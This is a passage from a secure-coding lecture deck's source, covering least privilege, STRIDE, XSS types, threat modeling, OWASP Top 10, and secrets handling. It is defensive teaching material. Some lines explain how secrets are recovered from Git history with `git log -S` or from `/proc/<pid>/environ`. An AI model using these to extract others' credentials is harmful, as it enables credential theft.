6. **Enforce Container Security Policies**: Define Pod Security Admission policies (Kubernetes) or Docker security profiles requiring non-root user, read-only root filesystem, and explicitly dropped Linux capabilities (drop ALL; add back only what is required, such as NET_BIND_SERVICE).
7. **Scope and Rotate API Keys**: Request the minimum OAuth scopes necessary; store all secrets in a dedicated secrets manager (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault); rotate keys on a scheduled cadence and immediately upon any suspected exposure.
8. **Conduct Quarterly Access Reviews**: Review all service account permissions, API scopes, and OS user memberships quarterly; revoke any permissions that are no longer required by current functionality; retain audit logs of all access review outcomes.
:::

:::notes
Secure coding practices reduce the probability that a vulnerability exists, but no development process can guarantee the complete absence of vulnerabilities in a complex application. Defense-in-depth security architecture recognizes this reality and applies the principle of least privilege throughout the application stack as a compensating control: even when a vulnerability is successfully exploited, the damage is limited by the constrained privileges of the compromised component.

At the database layer, the least privilege principle demands that the application's database connection use a dedicated service account with the minimum permissions necessary for its specific operations. An e-commerce application's product catalog service needs only `SELECT` permissions on the `products` and `categories` tables. The order processing service needs `SELECT` and `INSERT` on the `orders` table. Neither service should have `DELETE` privileges, `ALTER TABLE` permissions, or access to the administrative schemas. If an attacker exploits a SQL injection vulnerability in the product catalog service, they will find themselves authenticated as a database user with read-only access to product data, a significant breach, but not a catastrophic one. Contrast this with an application connecting as the database administrator: a successful SQL injection becomes `DROP DATABASE`, the creation of backdoor accounts, or the exfiltration of the entire user table including password hashes.

The principle extends to the operating system layer. Web application servers should never run as the `root` user on Linux or the `SYSTEM` account on Windows. When a remote code execution vulnerability allows an attacker to escape the application and execute arbitrary OS commands, those commands run with the permissions of the process that was exploited. A web server running as a dedicated `www-data` user with no home directory, no shell, and no write permissions outside the web root directory severely limits what an attacker can do. They cannot modify system configuration files, install kernel modules, or access credentials stored in protected directories. Container orchestration platforms like Kubernetes enforce this through Pod Security Admission controls, which can require that containers run as non-root users and enforce read-only root filesystems.

API scope restriction applies the same principle to external integrations. An application that uses a third-party cloud storage API should authenticate with an API key scoped only to the specific bucket it needs and restricted to read-only access if writing is not required. An OAuth 2.0 token used to access a user's calendar should request only the minimum necessary scopes, `calendar.readonly` rather than a full Google account access token. If the API key is inadvertently leaked through a code repository commit, environment variable misconfiguration, or application log exposure, the damage is bounded by the scope of that specific key.

This layered least-privilege architecture, service accounts, OS user isolation, container hardening, and API scope restriction, implements what NIST SP 800-53 calls Defense in Depth (SA-8(b)). It transforms a potentially catastrophic exploit into a contained incident, giving security operations teams the time they need to detect, respond to, and remediate the compromise before additional damage is done. Organizations that combine secure coding practices with robust least-privilege architecture achieve substantially better security outcomes than those that rely on either approach alone.

NIST SP 800-53 Revision 5 control AC-6 (Least Privilege) formally requires that information systems employ the principle of least privilege, allowing only authorized accesses for users and processes necessary to accomplish assigned organizational tasks. The 2020 Twitter breach illustrates this at the internal user access layer: attackers used phone spear-phishing (vishing) to socially engineer Twitter employees into surrendering credentials for the company's internal customer support tools. Post-incident investigation revealed that the compromised administrative tools were accessible to far more employees than operationally required, a direct violation of the need-to-know and least-privilege principles. Attackers used those over-privileged accounts to hijack high-profile accounts including those of Barack Obama, Elon Musk, and Joe Biden and broadcast a cryptocurrency scam to a combined audience of over 100 million followers. Limiting administrative tool access to a minimal set of vetted operators would have dramatically reduced the blast radius of the credential compromise, even after successful social engineering.
:::

%%%
---
unit: Threat Modeling
code: TM1
title: "Threat Modeling with STRIDE"
---
:::callout style=soft
**Threat modeling** is a structured technique for identifying, enumerating, and prioritizing security threats during the design phase, before code is written. The **STRIDE** framework, developed at Microsoft, categorizes threats into six types mapped to security properties.
:::

:::table
| STRIDE Category | Threat Type | Violated Property | Example |
|---|---|---|---|
| **S**poofing | Impersonating another user or system | Authentication | Forging a session cookie to log in as admin |
| **T**ampering | Modifying data or code | Integrity | Altering an unsigned JWT payload |
| **R**epudiation | Denying that an action occurred | Non-repudiation | Deleting server logs after an attack |
| **I**nformation Disclosure | Exposing data to unauthorized parties | Confidentiality | Verbose error messages revealing DB schema |
| **D**enial of Service | Making a system unavailable | Availability | Flooding an unauthenticated endpoint |
| **E**levation of Privilege | Gaining higher access than authorized | Authorization | A guest user accessing admin API endpoints |
:::

:::image src="images/23_stride_threat_model_diagram.png" alt="Hexagonal rosette diagram on white background. Center hexagon labeled 'Application System'. Six surrounding hexagons, each a STRIDE threat type with a distinct color: Spoofing (orange, mask icon), Tampering (red, pencil-over-document icon), Repudiation (grey, erased-log icon), Information Disclosure (blue, open-lock icon), Denial of Service (yellow, stop-sign icon), Elevation of Privilege (purple, upward-arrow-through-shield icon). Each outer hexagon connects to the center with a labeled arrow showing the violated security property (Authentication, Integrity, Non-repudiation, Confidentiality, Availability, Authorization). Below each threat hexagon, a small example attack is listed in italic text." caption="STRIDE maps the six threat categories to the six core security properties of a system. Systematically enumerating STRIDE threats against each component of a data flow diagram reveals design-phase vulnerabilities before any code is written." width=full
:::

:::notes
Threat modeling is the design-phase activity that allows security architects and development teams to identify and address vulnerabilities before implementation begins, when changes are cheapest. The most widely adopted threat modeling framework in enterprise software development is STRIDE, created by Loren Kohnfelder and Praerit Garg at Microsoft in 1999 and formalized in the Microsoft Security Development Lifecycle. STRIDE is an acronym for six threat categories that collectively represent the full space of attacks that can be mounted against a software component.

The STRIDE methodology begins by creating a Data Flow Diagram (DFD) of the application being designed. A DFD maps every external entity (users, external services, third-party APIs), every process (code components that transform data), every data store (databases, caches, file systems), and every data flow (communications between components). Once the DFD is complete, the threat modeling team systematically examines each element against the STRIDE categories to generate a list of potential threats.

Spoofing threats target authentication, the ability of the system to verify the identity of a communicating party. A threat modeler reviewing an authentication flow asks: "What could an attacker impersonate? Could they forge a session token? Could they intercept and replay a legitimate credential? Is the server's identity verified by the client, or is there a risk of connecting to a man-in-the-middle?" Mitigations for spoofing threats include strong multi-factor authentication, mutual TLS for service-to-service communication, and cryptographically signed session tokens.

Tampering threats target data and code integrity. On a data flow, a tampering threat might be: "This message is transmitted over HTTP without signing; an attacker on the network could modify the cart total before it reaches the payment processor." Mitigations include TLS encryption of all data in transit, HMAC message authentication codes, digital signatures, and database access controls that prevent unauthorized modification. CWE-345 (Insufficient Verification of Data Authenticity) captures the tampering threat class.

Repudiation threats exploit the absence of non-repudiation controls, audit logging, signed transaction records, and the ability to definitively attribute actions to specific authenticated users. A repudiation threat might read: "After processing a financial transaction, there is no immutable audit log entry that records which authenticated user account authorized the transfer; a malicious insider could deny approving a fraudulent transaction." Mitigations include append-only audit logging, log signing, and centralized log management with tamper protection.

Information Disclosure threats target confidentiality. The threat model for a login form might note: "The error message 'No account found with that email address' allows attackers to enumerate valid user accounts through the login form." Additional examples include stack traces in error pages that reveal framework versions, database schema names in SQL error messages, or sensitive data logged to application logs in plaintext. NIST SP 800-53 control SI-12 (Information Management and Retention) and CWE-209 (Generation of Error Message Containing Sensitive Information) both address this category.

Denial of Service threats target availability. The threat model might note: "The product search endpoint accepts arbitrary regex patterns; a crafted ReDoS (Regular Expression Denial of Service) pattern could cause catastrophic backtracking in the regex engine and block all CPU threads for minutes." Other DoS threats include unauthenticated endpoints with expensive database queries, file upload endpoints with no size limits, and APIs without rate limiting.

Elevation of Privilege threats, sometimes called authorization flaws, target the authorization control that prevents authenticated users from performing actions beyond their role. A threat might read: "The order cancellation API checks that the user is authenticated but does not verify that the order belongs to the authenticated user's account; any authenticated user could cancel any other user's order by guessing the order ID." This threat class maps directly to CWE-285 (Improper Authorization) and OWASP A01:2021 (Broken Access Control), the top-ranked category in the OWASP Top 10. STRIDE becomes concrete when applied to a familiar application: naming one threat per category, spoofing, tampering, repudiation, information disclosure, denial of service and elevation of privilege, for an e-commerce site or banking app turns the abstract categories into specific risks.
:::

%%%
---
unit: Input Handling
code: XSS
title: "Cross-Site Scripting (XSS): Stored, Reflected, and DOM-Based"
---
:::callout style=soft
**Cross-Site Scripting (XSS)**, catalogued as **CWE-79**, is an injection attack where malicious scripts are injected into content delivered to other users' browsers. Three distinct XSS variants require separate defensive strategies.
:::

:::table
| XSS Type | Injection Point | Persistence | Classic Example |
|---|---|---|---|
| **Stored (Persistent)** | Database / Server Storage | Persists across sessions | Malicious script in a forum post served to every visitor |
| **Reflected (Non-Persistent)** | URL Parameter / Form Field | Single request/response cycle | Script in a search query reflected in the "You searched for:" output |
| **DOM-Based** | Client-Side JavaScript | Never reaches server | `document.location.hash` written to `innerHTML` without encoding |
:::

:::image src="images/23_xss_three_types_comparison.png" alt="Three-column diagram on white background, each column illustrating one XSS variant with a numbered attack flow. Column 1 (Stored XSS, red): Attacker posts malicious comment → Server stores it in DB → Victim loads page → Server retrieves and serves stored script → Script executes in victim's browser. Column 2 (Reflected XSS, orange): Attacker crafts malicious URL → Sends URL to victim (phishing) → Victim clicks link → Server reflects parameter in response → Script executes in victim's browser. Column 3 (DOM-Based XSS, yellow): Attacker crafts malicious URL with fragment (#) → Victim clicks link → Server returns normal page → Client-side JavaScript reads URL fragment and writes to DOM → Script executes without server involvement. Browser and server icons color-coded. Attack payloads shown as red code snippets." caption="The three XSS types differ by persistence and injection point: Stored XSS is the most dangerous (affects all visitors), Reflected XSS requires social engineering, and DOM-Based XSS bypasses server-side defenses entirely." width=full
:::

:::notes
Cross-Site Scripting is the most frequently exploited web application vulnerability category, consistently appearing in the OWASP Top 10 across all editions. It is catalogued under CWE-79 (Improper Neutralization of Input During Web Page Generation) and was part of A03:2021 – Injection in the 2021 OWASP Top 10. XSS attacks allow attackers to execute JavaScript in the context of a victim's authenticated browser session, enabling session token theft, keylogging, phishing overlay injection, and actions performed on the victim's behalf. Understanding the three distinct XSS variants is essential because each requires a slightly different defensive approach and each represents a different attacker model.

Stored XSS, also called Persistent XSS, is the highest-severity variant. The attacker submits a payload that the server stores in a persistent data store, a database, a file system, a message queue. When any subsequent user requests the page that displays the stored data, the server retrieves and delivers the attacker's payload embedded in the HTML response. The victim's browser, receiving what appears to be a normal page from the trusted server, executes the script. A single stored XSS payload can compromise every user who visits the affected page until the payload is removed. The 2010 Twitter "onMouseOver" worm demonstrated stored XSS at scale: a single tweet containing a crafted `onmouseover` JavaScript attribute propagated to hundreds of thousands of accounts within hours as users hovered over affected tweets, automatically retweeting the payload and infecting their followers' timelines.

Reflected XSS requires the attacker to deliver a crafted URL to the victim, typically through phishing email or social media. The URL contains the XSS payload as a query parameter. When the victim clicks the link, the server reflects the parameter value back into the HTML response without encoding, perhaps in a "You searched for: [query]" message or an error page. The victim's browser executes the reflected script in the context of the legitimate site. While this requires social engineering to deliver the URL, modern browser security features like HttpOnly cookies limit but do not eliminate the damage.

DOM-Based XSS is the most architecturally distinct variant and the most likely to evade server-side defenses, because the vulnerability exists entirely in client-side JavaScript code and the malicious payload never reaches the server. The attack occurs when JavaScript reads data from an attacker-controllable source (the URL fragment `location.hash`, `document.referrer`, `document.cookie`, or `postMessage` data) and writes it to a dangerous sink (`innerHTML`, `document.write()`, `eval()`, `setTimeout()` with a string argument) without sanitization. A common example is single-page applications that use URL fragments to determine what content to display: `window.location.hash.substring(1)` written to `innerHTML` creates a DOM XSS sink that no server-side output encoding can protect. The defense requires sanitizing or avoid writing to dangerous DOM sinks in client-side code, using safe alternatives like `textContent` instead of `innerHTML`, and implementing a restrictive Content Security Policy.

Defenses for all three XSS types share common elements: context-aware output encoding (HTML-encode in HTML context, JavaScript-escape in script context), Content Security Policy headers to restrict which scripts the browser will execute, HttpOnly and Secure flags on session cookies, and sanitization of rich-text input with an allowlist-based library. NIST SP 800-53 Revision 5 controls SI-10 and SI-15 address the input validation and output filtering requirements that underpin XSS prevention. ISO/IEC 27001:2022 Annex A control 8.28 (Secure Coding) requires that organizations define and apply secure coding standards that explicitly address injection prevention, encompassing XSS. DOM-based XSS executes entirely in the browser: a page that writes the URL fragment (the part after #) into innerHTML will run a script supplied in that fragment, with no server request at all. This makes clear that the vulnerability is in the client-side code, not the server.
:::

%%%
---
unit: SDLC
code: TMD
title: "Threat Modeling Process: DFDs and Trust Boundaries"
---
:::callout style=soft
Effective threat modeling requires building a **Data Flow Diagram (DFD)** that maps all data flows, components, and **trust boundaries**, the lines across which data moves between zones of different privilege. Every trust boundary crossing is a potential attack surface.
:::

:::steps
1. **Define Scope**: Identify the feature or system to be modeled; set the boundary of what is in scope for this threat model.
2. **Enumerate Assets**: List what data and functionality must be protected (user PII, payment records, admin functions, session tokens).
3. **Draw the DFD**: Map external entities, processes, data stores, and data flows using standard DFD notation.
4. **Identify Trust Boundaries**: Draw trust boundary lines wherever data crosses from one privilege zone to another (internet to DMZ, DMZ to internal network, user to admin context).
5. **Apply STRIDE per Element**: Systematically enumerate STRIDE threats for each DFD element (processes, data flows crossing boundaries, data stores).
6. **Rate Threats with DREAD or CVSS**: Score each identified threat by Damage, Reproducibility, Exploitability, Affected Users, and Discoverability (DREAD) or using a CVSS 3.1 base score for severity prioritization.
7. **Define Mitigations**: For each threat, specify the concrete security control that addresses it and assign it to the responsible developer or team as a security requirement.
8. **Validate Mitigations**: After implementation, verify that each mitigation was correctly implemented (often via a targeted security test or code review).
:::

:::image src="images/23_dfd_trust_boundaries.png" alt="Data Flow Diagram with trust boundaries. Four zones separated by dashed red boundary lines: External Zone (Internet, labeled 'Untrusted'), DMZ Zone (Web Server, labeled 'Partially Trusted'), Application Zone (App Server + Database, labeled 'Trusted'), and Admin Zone (Admin Console, labeled 'Highly Trusted'). Data flows shown as arrows crossing boundaries: User HTTP Request crosses External-to-DMZ boundary (labeled 'Trust Boundary 1: validate and TLS-terminate'), App Server database query crosses DMZ-to-Application boundary (labeled 'Trust Boundary 2: parameterized queries, service account'), Admin access crosses Application-to-Admin boundary (labeled 'Trust Boundary 3: MFA required, audit logged'). DFD elements use standard notation: rectangles for external entities, rounded rectangles for processes, parallel lines for data stores." caption="Every trust boundary crossing is an attack surface. The threat model must enumerate all trust boundaries and specify the security controls that validate data as it crosses each one." width=full
:::

:::notes
Threat modeling sessions that begin with STRIDE categories before drawing a Data Flow Diagram consistently produce incomplete threat lists because the team is reasoning abstractly rather than reasoning about specific data flows in the actual system. The Microsoft Threat Modeling Tool, OWASP Threat Dragon, and IriusRisk all enforce DFD-first workflows for this reason: the diagram externalizes the team's mental model of the system, surfaces incorrect assumptions, and provides a systematic structure for enumeration.

The DFD uses four standard notation elements. External Entities (drawn as rectangles) represent sources and sinks of data that are outside the system's control: end users, mobile apps, third-party APIs, partner systems, and external payment processors. Processes (drawn as rounded rectangles or circles) represent software components that transform data: the web server, the authentication service, the payment processing module, the admin dashboard. Data Stores (drawn as parallel horizontal lines) represent persistent data storage: relational databases, file systems, caches, message queues, and object storage buckets. Data Flows (drawn as arrows) represent the movement of data between these elements, labeled with the data type being transferred (user credentials, session token, order payload, etc.).

Trust boundaries are the most critical conceptual element in the DFD. A trust boundary is drawn wherever data moves from a zone of one trust level to a zone of a different trust level. The boundary between the public internet and the DMZ is a trust boundary: all data flowing inward across it must be validated, encoded, and sanitized regardless of its apparent source, because it originated in the completely untrusted internet zone. The boundary between the web server and the internal application server is a trust boundary: authentication and authorization must be re-verified even for requests that have already passed through the web tier, applying defense in depth. The boundary between a regular user context and an administrative function is a trust boundary: privilege escalation attacks exploit insufficient validation at exactly this boundary, as captured by STRIDE's Elevation of Privilege category.

The threat modeling session should be time-boxed and structured. A typical session for a medium-complexity feature runs two to four hours. Participants include a developer who built the feature (deep system knowledge), a security engineer (threat enumeration expertise), a QA engineer (test scenario knowledge), and optionally an architect for cross-system context. The output is a documented list of threats with assigned severity scores and linked mitigation work items. Microsoft's SDL mandates that threat model documentation be stored alongside the design documentation for the feature and reviewed whenever the design changes significantly.

Microsoft introduced the STRIDE framework as part of its Security Development Lifecycle following a thorough internal review of historical security bugs in Windows and Office. The analysis found that the overwhelming majority of critical vulnerabilities fell into the six STRIDE categories, making STRIDE a practically complete enumeration of threat types at the design level. More recent academic and industry frameworks like PASTA (Process for Attack Simulation and Threat Analysis) and LINDDUN (for privacy threats) extend the STRIDE model for specific use cases, but STRIDE remains the most widely taught and most broadly applicable starting point. NIST SP 800-154 (Guide to Data-Centric System Threat Modeling) provides a complementary data-centric perspective that aligns well with STRIDE's threat enumeration but focuses more explicitly on protecting specific data assets rather than system components. ISO/IEC 27005:2022 (Information Security Risk Management) provides the formal risk assessment framework within which threat modeling findings should be documented and tracked as information security risks.
:::

%%%
---
unit: Input Handling
code: CHK1
title: "Mid-Lecture Checkpoint: Input Handling"
---
:::callout style=soft
Pause and consolidate: test your understanding of the input handling concepts covered so far before we move into secure SDLC and testing topics.
:::

:::list style=tight
- **Q1**: A login form accepts a username. Which validation approach is correct: reject inputs containing single quotes, or accept only inputs matching `^[a-zA-Z0-9_]{3,30}$`?
- **Q2**: A user submits the string `<b>Hello</b>` in a product review. The site must display the bold text. Should you sanitize, encode, or both, and at which stage?
- **Q3**: A developer performs input validation using JavaScript in the browser form. Is this sufficient? What must also be present?
- **Q4**: What is the difference between CWE-20 and CWE-79?
- **Q5**: Name two encoding contexts defined by the OWASP XSS Prevention Cheat Sheet and explain why the same character might require different encoding in each.
:::

:::image src="images/23_checkpoint_input_handling.png" alt="Quiz card layout on a white background with a light blue accent bar labeled 'Checkpoint: Input Handling'. Five numbered question cards arranged in a 2-3 grid. Each card has a question icon (magnifying glass over a form field) and the question text in a clean sans-serif font. Correct answer badges are hidden (greyed-out reveal buttons below each card). A progress bar at the top shows position in the lecture: 'Slides 1-9 of 30'. Clean, minimal academic style." caption="Checkpoint: five concept questions to verify mastery of allow-listing, encoding contexts, client-side vs. server-side validation, and the CWE taxonomy before advancing." width=full
:::

:::notes
Checkpoints are a proven pedagogical technique for consolidating learning before introducing new conceptual territory. Research in cognitive science, particularly the work of Roediger and Karpicke on the testing effect, demonstrates that retrieval practice, actively recalling information rather than passively re-reading it, produces significantly stronger long-term retention than additional study of the same material. This checkpoint is intentionally placed after the core input handling content (slides covering input validation, sanitization, output encoding, and XSS) and before the SDLC and testing methodology content, where students will encounter new frameworks that build on these foundational concepts.

Working through the five questions will surface any conceptual gaps in real time, while the material is still fresh, allowing the instructor to address misunderstandings before they propagate into incorrect mental models for the later content. Let us walk through the expected answers briefly so that instructors can guide the discussion.

Question 1 tests the allow-list versus block-list distinction. The correct answer is the regex allow-list `^[a-zA-Z0-9_]{3,30}$`. Rejecting only single quotes is a block-list approach that fails against URL-encoded single quotes, Unicode single quotation marks, and SQL injection techniques that do not use single quotes at all. The allow-list approach rejects all of these attack vectors by default because they do not match the defined pattern of acceptable characters.

Question 2 tests understanding of when to apply sanitization versus encoding and the principle of defense in depth. The correct answer is both, sanitize at ingestion using an allowlist-based HTML sanitizer (such as DOMPurify) to remove any elements that are not on the explicit safe list, and then apply context-appropriate output encoding when rendering the stored data. Applying only encoding would prevent XSS but would also convert the safe `<b>` tag into visible literal text rather than rendered bold. Applying only sanitization leaves the display layer unprotected against improperly sanitized data that might exist in legacy records.

Question 3 tests knowledge of the client-side versus server-side validation principle. Client-side JavaScript validation is not sufficient, it is trivially bypassed by disabling JavaScript, using browser developer tools to modify the form, or sending a raw HTTP request. Server-side validation must always be present as the authoritative security control; client-side validation is a user experience enhancement only.

Question 4 tests understanding of the CWE taxonomy. CWE-20 is Improper Input Validation, the failure to verify that input conforms to the expected type, length, format, and range before processing. CWE-79 is Improper Neutralization of Input During Web Page Generation (XSS), the failure to properly encode or sanitize user-controlled data before it is written into an HTML page where it can be interpreted as script by the browser. CWE-79 is a specific child weakness that can result from CWE-20 but is distinct: it specifically addresses the output encoding failure mode, while CWE-20 covers the general input validation failure mode.

Question 5 tests knowledge of encoding contexts. Any two of the five OWASP XSS contexts are acceptable answers. A commonly useful pair: HTML body context (where `<`, `>`, `&`, `"`, and `'` are encoded as HTML entities like `&lt;`) versus JavaScript string context (where the same characters and all non-alphanumeric characters are encoded using `\xHH` JavaScript hex escapes). The reason different encoding is required in each context is that each context is parsed by a different interpreter (HTML parser versus JavaScript engine) with different rules for what constitutes executable syntax. HTML entity encoding within a JavaScript string does not prevent JavaScript injection because the JavaScript engine processes the string before any HTML entity decoding occurs.
:::

%%%
---
unit: SDLC
code: OWT
title: "OWASP Top 10 (2021): A Developer's Security Checklist"
---
:::callout style=soft
The **OWASP Top 10** is the most widely referenced list of critical web application security risks. The 2021 edition reorganized categories around root causes rather than specific attack techniques. Every developer team should verify their application against all ten categories before release.
:::

:::table
| Rank | Category | Root Cause | Key Control |
|---|---|---|---|
| A01 | Broken Access Control | Missing authorization checks | Enforce deny-by-default, check ownership |
| A02 | Cryptographic Failures | Weak/missing encryption | TLS everywhere, bcrypt/Argon2 for passwords |
| A03 | Injection (SQLi, XSS, LDAP) | Unsanitized user data in interpreters | Parameterized queries, output encoding |
| A04 | Insecure Design | No threat modeling | STRIDE threat modeling, security requirements |
| A05 | Security Misconfiguration | Default credentials, verbose errors | Hardened configs, disable unnecessary features |
| A06 | Vulnerable Components | Outdated dependencies with CVEs | SCA tools, SBOM, patch cadence |
| A07 | Identification & Auth Failures | Weak session management | MFA, short session timeouts, secure cookies |
| A08 | Software & Data Integrity Failures | Unsigned updates, insecure deserialization | Code signing, integrity checks |
| A09 | Security Logging Failures | Insufficient audit trails | Centralized logging, anomaly alerting |
| A10 | SSRF | Server fetches attacker-supplied URLs | Allowlist outbound URLs, disable unnecessary protocols |
:::

:::image src="images/23_owasp_top10_2021_overview.png" alt="Vertical ranked list visualization on white background styled as a countdown poster. Each of the 10 OWASP categories is a horizontal bar with rank number on the left (A01–A10), category name in bold center, and a risk severity indicator dot (red for high, orange for medium) on the right. Bars are colored from dark red (A01) fading to light orange (A10) to suggest decreasing relative prevalence. Small icons beside each category name illustrate the threat: broken lock for A01, cracked shield for A02, syringe for A03 (injection), blueprint with X for A04, gear with warning for A05, puzzle piece with CVE tag for A06, fingerprint for A07, unsigned package for A08, empty log file for A09, globe with arrow looping back for A10." caption="OWASP Top 10 2021: the ten most critical web application security risk categories, ordered by prevalence, detectability, and estimated impact. Secure coding controls directly mitigate A01 through A05 and A07." width=full
:::

:::notes
The OWASP Top 10 was first published in 2003 and has been updated approximately every three to four years to reflect changes in the threat landscape, development practices, and the types of vulnerabilities most commonly found in real-world applications through security assessments, bug bounty programs, and incident reports. The 2021 edition reflects data from over 500,000 applications provided by more than 40 organizations worldwide, making it the most empirically grounded edition in the list's history. Understanding the OWASP Top 10 is a baseline competency for any developer writing web application code, and many compliance frameworks, including PCI-DSS 4.0, which explicitly references OWASP in Requirement 6.2.4, require that development teams demonstrate awareness of and controls for the Top 10 categories.

A01:2021 – Broken Access Control moved from fifth place in the 2017 edition to first, reflecting the extreme prevalence of authorization failures found in application security assessments. Broken access control encompasses a broad category of failures: insecure direct object references (IDOR) where an attacker accesses another user's records by changing an ID parameter, missing function-level authorization checks that allow regular users to call admin-only API endpoints, and privilege escalation through JWT token manipulation. The root control is a deny-by-default authorization model implemented and enforced on the server side, no request should be permitted to access a resource without an explicit, verified authorization check.

A02:2021 – Cryptographic Failures covers data exposure through insufficient or absent cryptographic protection of sensitive data in transit and at rest. This category includes transmitting sensitive data over unencrypted HTTP, storing passwords using reversible or weakly hashed algorithms (MD5, SHA-1 without salting), using cryptographically weak random number generators for session tokens, and exposing private keys or API secrets. The primary controls are TLS 1.2 or higher for all data in transit, Argon2id or bcrypt for password storage, and cryptographically strong PRNG (such as `secrets.token_hex()` in Python or `SecureRandom` in Java) for all security-relevant random values.

A03:2021 – Injection consolidates several injection types including SQL injection (CWE-89), LDAP injection, OS command injection (CWE-78), and XSS (CWE-79) under a single root cause: unsanitized user-controlled data being passed to an interpreter. This unification reflects the insight that all injection vulnerabilities share the same fundamental flaw, the failure to distinguish data from code in an interpreter context, and therefore share the same fundamental solution: parameterization, encoding, and validation.

A04:2021 – Insecure Design is a new category in 2021 that represents a philosophical shift in the OWASP Top 10: it recognizes that many of the most severe vulnerabilities are not implementation bugs but architectural design failures. Business logic flaws, missing rate limiting, absent threat model documentation, and designs that assume all users are benign are all insecure design patterns. The control for this category is not a code-level fix but a process-level change: mandatory threat modeling, security requirements gathering, and security design review as part of the SSDLC.

A06:2021 – Vulnerable and Outdated Components, formerly titled "Using Components with Known Vulnerabilities," is directly addressed by Software Composition Analysis tooling. Log4Shell (CVE-2021-44228, CVSS 10.0) is the definitive example: organizations that did not practice SCA had no visibility into which applications contained the vulnerable library, while organizations with SCA tooling and a maintained SBOM were able to query their inventory immediately and prioritize patching based on exposure risk. NIST SP 800-53 Revision 5 control SA-22 (Unsupported System Components) addresses this category by requiring organizations to replace or provide mitigating controls for components that are no longer supported by the developer.
:::

%%%
---
unit: SDLC
code: SEC
title: "Secrets Management: Never Hard-Code Credentials"
---
:::callout style=soft
**Secrets**, API keys, database passwords, private keys, OAuth tokens, must never appear in source code, configuration files committed to version control, or application log output. Secrets must be injected at runtime from dedicated secrets management infrastructure.
:::

:::list style=tight
- **CWE-798**: Use of Hard-coded Credentials, ranked in the CWE Top 25.
- **Git History Problem**: Even if a secret is removed in a later commit, it persists in the repository's full commit history and can be retrieved with `git log -p`.
- **Environment Variables as Secrets**: Better than hard-coded but still visible in process lists, child processes, and many crash dump formats, prefer a secrets manager.
- **Secrets Manager Pattern**: Application requests credentials at runtime from a dedicated vault (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager); the vault returns short-lived credentials and maintains an audit log of every access.
- **Secret Scanning**: Tools like GitHub Advanced Security, GitLeaks, and TruffleHog scan repository commits for credential patterns and alert developers before secrets are merged to main branches.
- **Rotation Policy**: Secrets must be rotatable without application downtime; applications must handle seamless credential rotation, typically by requesting fresh credentials on each connection pool initialization.
:::

:::image src="images/23_secrets_management_pattern.png" alt="Architecture diagram on white background showing two paths: Bad Path (red) and Good Path (green). Bad Path: Developer writes API_KEY='sk-abc123' directly in application source code → Code committed to Git → API key visible in repository history, CI logs, and production config files → Attacker scans GitHub and finds key → Key used to access cloud resources. Good Path: Developer stores no secrets in code → Application at runtime calls HashiCorp Vault or AWS Secrets Manager API with an IAM role or Vault token → Secrets manager authenticates the application's identity, logs the access, and returns a short-lived credential → Application uses credential → Credential expires in one hour, limiting exposure window. Each step in the Bad Path has a red warning icon; each step in the Good Path has a green checkmark." caption="Secrets management architecture: credentials are never embedded in source code but are retrieved at runtime from a secrets vault that enforces authentication, provides audit logging, and issues short-lived credentials to limit exposure." width=full
:::

:::notes
Credential exposure through source code is one of the most consistently observed security failures in real-world application development, despite being entirely preventable through a combination of developer education, tooling, and process controls. CWE-798 (Use of Hard-coded Credentials) has appeared in every edition of the CWE Top 25 Most Dangerous Software Weaknesses, and research by GitGuardian in 2023 found that over 10 million secrets were detected in public GitHub repositories in a single year, a number that represents only the detectable subset of the actual problem, since many secrets do not match known patterns.

The hard-coded credential problem is compounded by Git's design as an immutable append-only history store. When a developer commits a file containing a hard-coded API key and subsequently removes the key in a follow-up commit, the key has not been erased, it persists in the repository's object store at the commit hash of the original commit, accessible forever to anyone with access to the repository by running `git log -S 'api_key' --all` or `git show <original_commit_hash>`. This means that a secret committed to a repository must be considered permanently exposed and must be immediately revoked and rotated, regardless of whether it was subsequently removed. The only remediation is credential rotation plus repository history rewriting using `git filter-repo` (the modern replacement for BFG Repo Cleaner), but rewriting shared repository history is disruptive and error-prone, reinforcing the principle that prevention is far cheaper than remediation.

Environment variables are frequently proposed as an alternative to hard-coded credentials, and they are a significant improvement, they are not embedded in source code and can be configured differently per environment. However, environment variables have their own security limitations: they are visible in `/proc/<pid>/environ` on Linux to any user with the same effective UID, they are inherited by all child processes the application spawns, they may be logged by many application frameworks during startup, and they are often captured in full by process crash dump mechanisms. For low-sensitivity development environments, environment variables managed by a tool like `direnv` or `.env` files excluded from version control via `.gitignore` are acceptable. For production systems handling sensitive data, a dedicated secrets manager provides meaningfully stronger security.

The secrets manager pattern decouples credential storage from application configuration. At runtime, the application authenticates to the secrets manager using a trusted identity mechanism, an IAM instance role assigned to the cloud VM, a Kubernetes service account token, or a Vault AppRole, and requests only the specific secrets it needs. The secrets manager verifies the application's identity, checks that the identity is authorized to access the requested secret, returns the credential, and logs the access event. The application never stores the credential persistently; it holds it in memory for the duration of its use. Short-lived credentials, typically expiring in one to four hours, further limit the damage of a credential leak: an attacker who obtains a credential from a crash dump or a memory dump finds that it expires before they can fully exploit it.

The 2022 Twilio breach illustrates credential exposure through a different vector: smishing (SMS phishing) was used to compromise employee credentials for internal Twilio systems. Post-incident analysis revealed that some service credentials were stored in plaintext in internal documentation systems rather than a secrets vault, allowing the attacker to pivot from the initial access to a broader set of systems. The breach ultimately compromised the authentication data of 163 Twilio customer organizations, including Authy, a widely used MFA application. NIST SP 800-53 Revision 5 control IA-5 (Authenticator Management) addresses secrets management at the policy level, requiring that organizations protect authenticators (which include API keys and service credentials) commensurate with the security category of the information they protect. GitHub Advanced Security's secret scanning feature now automatically blocks pushes to GitHub repositories when they contain patterns matching over 200 known secret formats, providing a last-resort automated control when developer education and pre-commit hooks fail.
:::

%%%
---
unit: Input Handling
code: ERR
title: "Secure Error Handling and Logging"
---
:::callout style=soft
Verbose error messages are a reconnaissance gift to attackers. Secure error handling presents **generic messages to users** while logging **detailed diagnostics internally**. Application logs must capture security events but must never log sensitive data.
:::

::::columns ratio=1:1
::col::
::::card heading="Insecure Error Response (Avoid)"
:::list style=tight
- Stack trace including framework version, class names, and line numbers displayed to the user.
- Database error message revealing table name, column name, or query structure.
- "User not found" vs. "Incorrect password", distinguishing messages allow account enumeration.
- Exception dump exposing internal IP addresses, file paths, or credentials.
:::
::::
::col::
::::card heading="Secure Error Response (Implement)"
:::list style=tight
- Generic user-facing message: "An error occurred. Please try again or contact support (Reference: ERR-7f3a)."
- Error reference ID links the user-visible message to a detailed internal log entry.
- Identical error messages for "user not found" and "wrong password" to prevent account enumeration (CWE-204).
